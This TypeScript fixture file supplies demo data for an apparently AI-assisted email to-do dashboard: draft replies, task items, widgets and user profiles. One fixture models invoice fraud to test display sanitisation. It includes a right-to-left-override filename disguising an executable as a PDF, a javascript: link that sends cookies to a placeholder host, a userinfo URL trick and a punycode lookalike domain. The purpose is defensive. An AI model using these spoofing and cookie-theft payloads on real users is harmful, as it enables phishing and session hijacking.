import type {
  DashboardWidget,
  ManualPayload,
  Profile,
  Todo,
  TodoPayload,
} from "@/lib/types";

/*
  Fixtures for demo mode. This is what the public showcase deployment renders.

  The content is written to show the product honestly: a queue of things Dovis
  PROPOSES, in a spread of states, including one failure. A demo where everything
  succeeds hides the part of the design that matters most.

  The same applies to attention. All five levels appear, but so do the two cases
  that are easy to build a demo without and then ship a bug in: an item with a
  level and no reason, and items with no level at all. Notice also that attention
  and `priority` disagree here — t11 is low priority and needs acting on this
  week — because they answer different questions and a fixture where they always
  match would make deriving one from the other look reasonable.
*/

const now = Date.now();
const minutesAgo = (m: number) => new Date(now - m * 60_000).toISOString();

/*
  U+202E RIGHT-TO-LEFT OVERRIDE, written as a code point rather than pasted in.
  A literal one is invisible in a diff, does not survive a copy-paste, and gets
  stripped by half the tools that touch this file — which would quietly delete
  the only fixture that proves sanitizeDisplay() works.

  Used once, in t12, to build the filename attack: everything after it renders
  right-to-left, so `INV-4471-remittance<RLO>fdp.exe` reads on screen as
  `INV-4471-remittanceexe.pdf` and the reader decides about an executable he was
  shown as a PDF. Escaping does nothing about it — the bytes are innocent and
  the glyph order is the payload.
*/
const RLO = String.fromCharCode(0x202e);

/*
  The payload behind t12, written once and used for both `payload_proposed` and
  `payload_current`.

  Every fixture above it writes that pair out twice, because a DRAFT can
  genuinely diverge: /api/act moves a modified row on and the box rewrites
  `payload_current` while `payload_proposed` is never overwritten, so the two
  really are different data. A manual item nobody has modified has no such
  divergence to represent, and writing sixty lines out twice would only create
  somewhere for the two copies to drift apart.
*/
const hostilePayload: ManualPayload = {
  from: "acme.billing.dept@gmail.com",
  // Not labelled by this build, so it lands in the unlabelled-key sweep at the
  // bottom of the panel — which is exactly where the reader can see the two
  // halves that `sender_domain_mismatch` is a comparison between.
  reply_to: "remit@acme-billing-secure.example",
  task: "The message asks for the remittance account on INV-4471 to be changed before Friday's run. Nothing has been actioned. Check the account with Acme on a number you already have before anything is paid.",
  subject: "URGENT: updated remittance details for INV-4471",
  email_id: "19a7f0c31d84be22",
  email_flags: [
    "attachment_received",
    "pdf_attachment",
    "external_links",
    "external_sender",
    "free_mailbox_sender",
    "sender_domain_mismatch",
    // Unrecognised on purpose. It has no label in this build, so it renders as
    // NO flag and surfaces in the unlabelled-key sweep instead. Remove it and
    // the default-deny stops being demonstrable.
    "possible_invoice_fraud",
  ],
  attachments: [
    {
      // Reads as `INV-4471-remittanceexe.pdf` if nothing strips the override.
      // sanitizeDisplay() removes it, so the card shows the real spelling and
      // the real extension.
      filename: `INV-4471-remittance${RLO}fdp.exe`,
      // Declares application/pdf and is classified `other` anyway: `kind` comes
      // from what the box measured in the bytes, never from the name or the
      // declared type, so neither the icon nor the badge can be talked into
      // saying PDF.
      mime_type: "application/pdf",
      size_bytes: 1_468_006,
      kind: "other",
    },
    {
      filename: "Acme_letterhead.png",
      mime_type: "image/png",
      size_bytes: 96_400,
      kind: "image",
    },
  ],
  /*
    The link design in one card. Each row is a different refusal, and every one
    of them still shows where it goes, because a link nobody can inspect is
    worse than a link nobody can click.
  */
  links: [
    // Plainly external and well formed: it passes the check, and STILL does not
    // become an anchor until the reader presses the button.
    {
      url: "https://acme-industrial.example/contact",
      title: "Acme contact page",
    },
    // The title says one company; the host is a different registered domain
    // entirely. The host is the headline for exactly this reason.
    {
      url: "https://acme-billing.verify-invoice-portal.example/pay/INV-4471",
      title: "Acme secure payment portal",
    },
    // Refused on scheme. React rewrites javascript: hrefs in production and
    // does nothing to data:, vbscript: or file:, so the allowlist is what is
    // actually holding here.
    {
      url: "javascript:document.location='https://collect.example/'+document.cookie",
      title: "Click here to confirm receipt",
    },
    // Refused on userinfo. Everything before the @ is a username; this lands on
    // pay-verify.example, not on accounts.example.com.
    {
      url: "https://accounts.example.com@pay-verify.example/reset",
      title: "Verify your account",
    },
    // Refused as an internationalised host. Displayed in punycode, which is
    // ugly and is the point: the readable spelling imitates another domain.
    {
      url: "https://xn--pypal-4ve.example/invoice/4471",
      title: "Secure invoice checkout",
    },
  ],
};

export const demoTodos: Todo[] = [
  {
    id: "t1",
    title: "Reply to Stanley Chen about the Q3 budget shortfall",
    action_type: "draft_email",
    status: "proposed",
    priority: "high",
    source: "email",
    created_at: minutesAgo(24),
    confirmed_at: null,
    completed_at: null,
    attention: "urgent",
    attention_reason: "Stanley has asked twice, and the board reviews these figures on Thursday.",
  },
  {
    id: "t2",
    title: "Decline the Thursday panel invitation — it clashes with the board call",
    action_type: "draft_email",
    status: "proposed",
    priority: "normal",
    source: "calendar",
    created_at: minutesAgo(51),
    confirmed_at: null,
    completed_at: null,
    attention: "informational",
    attention_reason: "Flagged high importance by the sender, but the clash is already resolved on your calendar.",
  },
  {
    id: "t3",
    title: "Confirm the Taipei office lease walkthrough for Friday 10:00",
    action_type: "draft_email",
    status: "proposed",
    priority: "normal",
    source: "email",
    created_at: minutesAgo(88),
    confirmed_at: null,
    completed_at: null,
    attention: "action_soon",
    attention_reason: "Friday is three days out and the agent holds the slot only until you confirm.",
  },
  {
    id: "t4",
    title: "Sign the renewed insurance policy — it needs your wet signature",
    action_type: "manual",
    status: "proposed",
    priority: "high",
    source: "email",
    created_at: minutesAgo(140),
    confirmed_at: null,
    completed_at: null,
    attention: "critical",
    attention_reason: "Cover lapses if the signed copy misses the 5th, and nobody else can sign it.",
  },
  {
    id: "t5",
    title: "Thank Ms. Lin for the introduction to the Kaohsiung distributor",
    action_type: "draft_email",
    status: "executing",
    priority: "low",
    source: "email",
    created_at: minutesAgo(190),
    confirmed_at: minutesAgo(4),
    completed_at: null,
    // A level with no reason. The reason is optional in the schema and the block
    // has to hold its shape without one, so one fixture is written without one.
    attention: "informational",
    attention_reason: null,
  },
  {
    id: "t6",
    title: "Send the revised timeline to the engineering leads",
    action_type: "draft_email",
    status: "done",
    priority: "normal",
    source: "chat",
    created_at: minutesAgo(320),
    confirmed_at: minutesAgo(240),
    completed_at: minutesAgo(238),
    // Never judged, so no block renders — not the calmest block. This row and
    // t10 are the absence case, which is the one a default would quietly break.
    attention: null,
    attention_reason: null,
  },
  {
    id: "t7",
    title: "Introduce Wei-Ting to the Singapore team",
    action_type: "draft_email",
    status: "rejected",
    priority: "low",
    source: "email",
    created_at: minutesAgo(400),
    confirmed_at: null,
    completed_at: null,
    attention: "attention",
    attention_reason: "Wei-Ting has been waiting a fortnight for an answer either way.",
  },
  {
    id: "t8",
    title: "Reply to the supplier about the delayed shipment",
    action_type: "draft_email",
    status: "failed",
    priority: "normal",
    source: "email",
    created_at: minutesAgo(505),
    confirmed_at: minutesAgo(470),
    completed_at: null,
    attention: "urgent",
    attention_reason: "The shipment is already late and no revised date has been given in writing.",
  },
  /*
    Manual items lifted out of mail. Their payloads below are the only way to see
    the source-email panel work without the real database, so they are written to
    cover the shapes that actually turn up rather than one tidy example.
  */
  {
    id: "t9",
    title: "Dormitory committee meeting — they need your answer before it is booked",
    action_type: "manual",
    status: "proposed",
    priority: "normal",
    source: "email",
    created_at: minutesAgo(63),
    confirmed_at: null,
    completed_at: null,
    attention: "attention",
    attention_reason: "They cannot book the room until the count is in, and the deadline is the 11th.",
  },
  {
    id: "t10",
    title: "Collect the notarised lease copy from the district office",
    action_type: "manual",
    status: "proposed",
    priority: "normal",
    source: "email",
    created_at: minutesAgo(118),
    confirmed_at: null,
    completed_at: null,
    // The shape of a row written before the column existed, still waiting on a
    // decision. It has a deadline and it is still not rated: whatever wrote it
    // had no opinion to record, and the card must not supply one on its behalf.
    attention: null,
    attention_reason: null,
  },
  {
    id: "t11",
    title: "Approve the Q4 stationery order before the supplier closes the quote",
    action_type: "manual",
    status: "proposed",
    priority: "low",
    source: "email",
    created_at: minutesAgo(35),
    confirmed_at: null,
    completed_at: null,
    attention: "action_soon",
    attention_reason: "The quote expires at the end of the week.",
  },
  /*
    The item this whole surface exists for: the supplier-invoice fraud shape.

    `manual`, not `draft_email`, and that is the important half. Confirming a
    manual item only marks it done, so the demo never shows Dovis offering to
    write a reply to a suspected fraud — which would be the product endorsing
    the message by proposing to answer it.

    Its facts and its attachments agree with each other, because a fixture whose
    flags contradict its own contents is the worst possible advertisement for a
    feature whose entire claim is that the flags describe what actually arrived.

    Note what the flags are NOT. Every one of them is a header or a MIME fact.
    Nothing here says scam, phishing or suspicious: the card hands over the
    gmail.com address, the disagreeing Reply-To, the executable dressed as a
    PDF and the address the payment link really goes to, and the reader does the
    judging. The attention block above the panel is where a judgement lives, and
    it is deliberately a separate mechanism with a separate look.
  */
  {
    id: "t12",
    title: "Update the bank details on invoice INV-4471 before Friday's payment run",
    action_type: "manual",
    status: "proposed",
    priority: "high",
    source: "email",
    created_at: minutesAgo(12),
    confirmed_at: null,
    completed_at: null,
    attention: "urgent",
    attention_reason:
      "A payment run is scheduled for Friday and this asks for the account to be changed first.",
  },
];

export const demoPayloads: Record<string, TodoPayload> = {
  t1: {
    todo_id: "t1",
    payload_proposed: {
      to: "stanley.chen@example.com",
      subject: "Re: Q3 budget — the shortfall",
      body: "Stanley,\n\nI've seen the numbers. The gap is real and it is mostly the hardware line, not headcount.\n\nI'd rather not decide this over email. Can you take 30 minutes on Thursday afternoon? I'll bring the revised figures and a proposal for where the cut lands.\n\nIf Thursday doesn't work, Friday morning is open.\n\nBest,",
    },
    payload_current: {
      to: "stanley.chen@example.com",
      subject: "Re: Q3 budget — the shortfall",
      body: "Stanley,\n\nI've seen the numbers. The gap is real and it is mostly the hardware line, not headcount.\n\nI'd rather not decide this over email. Can you take 30 minutes on Thursday afternoon? I'll bring the revised figures and a proposal for where the cut lands.\n\nIf Thursday doesn't work, Friday morning is open.\n\nBest,",
    },
    modify_note: null,
    reject_reason: null,
  },
  t2: {
    todo_id: "t2",
    payload_proposed: {
      to: "events@example.org",
      subject: "Re: Invitation — Thursday industry panel",
      body: "Thank you for thinking of me. I have a board call at the same hour and can't move it.\n\nI'd be glad to join a future one — please keep me on the list.\n\nBest,",
    },
    payload_current: {
      to: "events@example.org",
      subject: "Re: Invitation — Thursday industry panel",
      body: "Thank you for thinking of me. I have a board call at the same hour and can't move it.\n\nI'd be glad to join a future one — please keep me on the list.\n\nBest,",
    },
    modify_note: null,
    reject_reason: null,
  },
  t3: {
    todo_id: "t3",
    payload_proposed: {
      to: "leasing@example.com",
      subject: "Re: Site walkthrough",
      body: "Friday at 10:00 works. I'll come with our facilities lead.\n\nCould you have the floor plan and the service charge breakdown ready? Those are the two things that will decide it.\n\nBest,",
    },
    payload_current: {
      to: "leasing@example.com",
      subject: "Re: Site walkthrough",
      body: "Friday at 10:00 works. I'll come with our facilities lead.\n\nCould you have the floor plan and the service charge breakdown ready? Those are the two things that will decide it.\n\nBest,",
    },
    modify_note: null,
    reject_reason: null,
  },
  // The legacy manual shape: one `detail` string and nothing else. Rows written
  // before the box started splitting the mail into fields still look like this,
  // so this path stays exercised.
  t4: {
    todo_id: "t4",
    payload_proposed: {
      detail:
        "The renewal arrived from the broker this morning. It needs a physical signature and a scan returned before the 5th — I cannot sign for you. The policy terms are unchanged except the excess, which rose from NT$20,000 to NT$35,000.",
    },
    payload_current: {
      detail:
        "The renewal arrived from the broker this morning. It needs a physical signature and a scan returned before the 5th — I cannot sign for you. The policy terms are unchanged except the excess, which rose from NT$20,000 to NT$35,000.",
    },
    modify_note: null,
    reject_reason: null,
  },
  t5: {
    todo_id: "t5",
    payload_proposed: {
      to: "lin.meihua@example.com",
      subject: "Thank you for the introduction",
      body: "Ms. Lin,\n\nThank you for putting me in touch with the Kaohsiung distributor. We spoke yesterday and it was worth the call.\n\nI owe you one.\n\nBest,",
    },
    payload_current: {
      to: "lin.meihua@example.com",
      subject: "Thank you for the introduction",
      body: "Ms. Lin,\n\nThank you for putting me in touch with the Kaohsiung distributor. We spoke yesterday and it was worth the call.\n\nI owe you one.\n\nBest,",
    },
    modify_note: null,
    reject_reason: null,
  },
  t6: {
    todo_id: "t6",
    payload_proposed: {
      to: "eng-leads@example.com",
      subject: "Revised timeline",
      body: "Attaching the revised timeline. Two weeks later on integration, everything else holds.\n\nBest,",
    },
    payload_current: {
      to: "eng-leads@example.com",
      subject: "Revised timeline",
      body: "Team,\n\nRevised timeline attached. Integration moves two weeks; every other milestone holds.\n\nShout if that breaks something on your side.\n\nBest,",
    },
    modify_note: "Too curt. Open with the team and invite pushback.",
    reject_reason: null,
  },
  t7: {
    todo_id: "t7",
    payload_proposed: {
      to: "wei-ting@example.com",
      subject: "Introduction — Singapore team",
      body: "Wei-Ting, meet the Singapore team. I'll let you both take it from here.\n\nBest,",
    },
    payload_current: {
      to: "wei-ting@example.com",
      subject: "Introduction — Singapore team",
      body: "Wei-Ting, meet the Singapore team. I'll let you both take it from here.\n\nBest,",
    },
    modify_note: null,
    reject_reason:
      "Not yet — he hasn't signed the contract. Introducing him now implies he's staff.",
  },
  t8: {
    todo_id: "t8",
    payload_proposed: {
      to: "supplier@example.com",
      subject: "Re: Shipment delay",
      body: "Understood on the delay. Please confirm the revised arrival date in writing today.\n\nBest,",
    },
    payload_current: {
      to: "supplier@example.com",
      subject: "Re: Shipment delay",
      body: "Understood on the delay. Please confirm the revised arrival date in writing today.\n\nBest,",
    },
    modify_note: null,
    reject_reason: null,
  },
  /*
    The shape the box really writes for a manual item, reproduced key for key from
    a live row: seven keys, `task` carrying the content, and NO `detail`. The
    renderer used to read `detail` alone, so this exact payload rendered an empty
    panel. It is a fixture rather than a comment so that the empty panel cannot
    come back unnoticed.
  */
  t9: {
    todo_id: "t9",
    payload_proposed: {
      from: "dorm.office@example.edu.tw",
      task: "Reply with whether you are attending, and name a stand-in if you are not. They cannot book the room until the count is in.",
      event: "Dormitory committee — start-of-term meeting",
      subject: "【宿舍】期初委員會議出席確認",
      deadline: "2026-09-11",
      email_id: "18f2c9a4b7e01d33",
      location: "Building B, meeting room 2 (2F)",
      // An ordinary message with ordinary attachments, which is the case the
      // panel has to look calm for. The .xlsx carries the legacy declared type
      // Excel still writes, disagreeing with its own extension — a mismatch is
      // inspectable, not automatically alarming, and nothing flags it.
      email_flags: ["attachment_received", "image_attachment", "external_sender"],
      attachments: [
        {
          filename: "agenda-photo.jpg",
          mime_type: "image/jpeg",
          size_bytes: 184_320,
          kind: "image",
        },
        {
          filename: "委員名冊.xlsx",
          mime_type: "application/vnd.ms-excel",
          size_bytes: 24_576,
          kind: "other",
        },
      ],
      links: [
        {
          url: "https://dorm.example.edu.tw/committee/2026-09-11",
          title: "Meeting details and floor plan",
        },
      ],
    },
    payload_current: {
      from: "dorm.office@example.edu.tw",
      task: "Reply with whether you are attending, and name a stand-in if you are not. They cannot book the room until the count is in.",
      event: "Dormitory committee — start-of-term meeting",
      subject: "【宿舍】期初委員會議出席確認",
      deadline: "2026-09-11",
      email_id: "18f2c9a4b7e01d33",
      location: "Building B, meeting room 2 (2F)",
      // An ordinary message with ordinary attachments, which is the case the
      // panel has to look calm for. The .xlsx carries the legacy declared type
      // Excel still writes, disagreeing with its own extension — a mismatch is
      // inspectable, not automatically alarming, and nothing flags it.
      email_flags: ["attachment_received", "image_attachment", "external_sender"],
      attachments: [
        {
          filename: "agenda-photo.jpg",
          mime_type: "image/jpeg",
          size_bytes: 184_320,
          kind: "image",
        },
        {
          filename: "委員名冊.xlsx",
          mime_type: "application/vnd.ms-excel",
          size_bytes: 24_576,
          kind: "other",
        },
      ],
      links: [
        {
          url: "https://dorm.example.edu.tw/committee/2026-09-11",
          title: "Meeting details and floor plan",
        },
      ],
    },
    modify_note: null,
    reject_reason: null,
  },
  // Partial is the normal case, not the exception: the box writes what the mail
  // actually contained. Three keys here, and the panel shows three rows.
  t10: {
    todo_id: "t10",
    payload_proposed: {
      from: "records@example.gov.tw",
      task: "The notarised copy is ready for collection. Bring the original ID document — they will not release it to anyone else, so this cannot be delegated.",
      deadline: "2026-09-19",
    },
    payload_current: {
      from: "records@example.gov.tw",
      task: "The notarised copy is ready for collection. Bring the original ID document — they will not release it to anyone else, so this cannot be delegated.",
      deadline: "2026-09-19",
    },
    modify_note: null,
    reject_reason: null,
  },
  /*
    Keys this build has no label for — `received_at` and `cc_count`. They render
    raw underneath rather than disappearing, which is the whole point: the next
    field the box invents must be visible to the reader on the day it appears, not
    on the day someone happens to read the database.
  */
  t11: {
    todo_id: "t11",
    payload_proposed: {
      from: "supplies@example.com",
      task: "Confirm the headcount and approve the total. The quote expires at the end of the week and the price holds only at 40 units or more.",
      subject: "Q4 stationery — quote for approval",
      received_at: "2026-09-05T08:14:00+08:00",
      cc_count: 4,
      email_flags: [
        "attachment_received",
        "pdf_attachment",
        "external_links",
        "external_sender",
      ],
      attachments: [
        {
          filename: "Q4-stationery-quote.pdf",
          mime_type: "application/pdf",
          size_bytes: 245_760,
          kind: "pdf",
        },
        // Dovis saw a part and could not record it. The row stays, at reduced
        // emphasis, because hiding the failure would silently rewrite what the
        // message contained — the reader would be told there was one attachment
        // when there were two.
        {
          filename: "price-list-appendix.pdf",
          mime_type: "application/pdf",
          size_bytes: null,
          kind: "pdf",
          unavailable: true,
        },
      ],
      links: [
        {
          url: "https://supplies.example.com/quotes/Q4-2026",
          title: "View the full quote",
        },
      ],
    },
    payload_current: {
      from: "supplies@example.com",
      task: "Confirm the headcount and approve the total. The quote expires at the end of the week and the price holds only at 40 units or more.",
      subject: "Q4 stationery — quote for approval",
      received_at: "2026-09-05T08:14:00+08:00",
      cc_count: 4,
      email_flags: [
        "attachment_received",
        "pdf_attachment",
        "external_links",
        "external_sender",
      ],
      attachments: [
        {
          filename: "Q4-stationery-quote.pdf",
          mime_type: "application/pdf",
          size_bytes: 245_760,
          kind: "pdf",
        },
        // Dovis saw a part and could not record it. The row stays, at reduced
        // emphasis, because hiding the failure would silently rewrite what the
        // message contained — the reader would be told there was one attachment
        // when there were two.
        {
          filename: "price-list-appendix.pdf",
          mime_type: "application/pdf",
          size_bytes: null,
          kind: "pdf",
          unavailable: true,
        },
      ],
      links: [
        {
          url: "https://supplies.example.com/quotes/Q4-2026",
          title: "View the full quote",
        },
      ],
    },
    modify_note: null,
    reject_reason: null,
  },
  /*
    The hostile fixture. Everything in it is a FACT the box could establish
    without reading a word of the prose, and the whole point is that the facts
    are enough — nobody has to be told this is fraud to see what it is.

    It carries a code this build does not recognise, `possible_invoice_fraud`,
    on purpose. It has no label here, so it renders NOTHING as a flag: a chip
    with no words would be a warning that cannot name itself, and printing the
    code would hand whoever influenced the analyser a headline on the boss's
    dashboard. It surfaces instead in the unlabelled-key sweep at the bottom of
    the panel, which is where data nobody has a word for belongs. Remove it from
    this fixture and the default-deny stops being demonstrable.
  */
  t12: {
    todo_id: "t12",
    // One object under both keys, unlike every fixture above it — see the
    // comment on hostilePayload for why this pair has nothing to diverge.
    payload_proposed: hostilePayload,
    payload_current: hostilePayload,
    modify_note: null,
    reject_reason: null,
  },
};

export const demoWidgets: DashboardWidget[] = [
  {
    id: "w1",
    widget_type: "metric",
    title: "Waiting on you",
    position: 0,
    // Counts the proposed items above. The band and the headline read as one
    // sentence, so a stale number here reads as a broken dashboard.
    config: { kind: "metric", value: "8", caption: "of 31 handled since 06:00" },
  },
  {
    id: "w2",
    widget_type: "metric",
    title: "Handled without you",
    position: 1,
    config: {
      kind: "metric",
      value: "27",
      caption: "filed, ignored, or answered",
      delta: "+6",
    },
  },
  {
    id: "w3",
    widget_type: "metric",
    title: "Longest wait",
    position: 2,
    config: { kind: "metric", value: "2h 20m", caption: "insurance renewal" },
  },
  {
    id: "w4",
    widget_type: "chart",
    title: "Proposals this week",
    position: 3,
    config: {
      kind: "chart",
      unit: "items",
      series: [
        { label: "Mon", value: 9 },
        { label: "Tue", value: 14 },
        { label: "Wed", value: 11 },
        { label: "Thu", value: 18 },
        { label: "Fri", value: 8 },
      ],
    },
  },
  {
    id: "w5",
    widget_type: "list",
    title: "People waiting on a reply",
    position: 4,
    config: {
      kind: "list",
      items: [
        { label: "Stanley Chen", meta: "2 days" },
        { label: "Leasing agent", meta: "1 day" },
        { label: "Broker (insurance)", meta: "6 hours" },
      ],
    },
  },
  {
    id: "w6",
    widget_type: "checklist",
    title: "Today",
    position: 5,
    config: {
      kind: "checklist",
      items: [
        { label: "Board call, 14:00", done: false },
        { label: "Sign insurance renewal", done: false },
        { label: "Approve revised timeline", done: true },
      ],
    },
  },
];

export const demoProfiles: Profile[] = [
  {
    id: "p1",
    email: "owner@example.com",
    username: "owner",
    display_name: "You",
    role: "owner",
    status: "active",
    can_modify: true,
    must_change_password: false,
    created_at: minutesAgo(60 * 24 * 90),
    last_sign_in_at: minutesAgo(3),
    lang: "en",
  },
  {
    id: "p2",
    email: "assistant@example.com",
    username: "assistant",
    display_name: "Chia-Hui",
    role: "admin",
    status: "active",
    can_modify: false,
    must_change_password: false,
    created_at: minutesAgo(60 * 24 * 12),
    last_sign_in_at: minutesAgo(95),
    lang: "zh-TW",
  },
  {
    id: "p3",
    email: "temp.assistant@example.com",
    username: "newhire",
    display_name: "Jun-Hao",
    role: "admin",
    status: "paused",
    can_modify: false,
    must_change_password: true,
    created_at: minutesAgo(60 * 24 * 2),
    last_sign_in_at: null,
    // Never signed in, so nothing has seeded a language yet. The two facts
    // belong together: the first sign-in is what writes this.
    lang: null,
  },
];
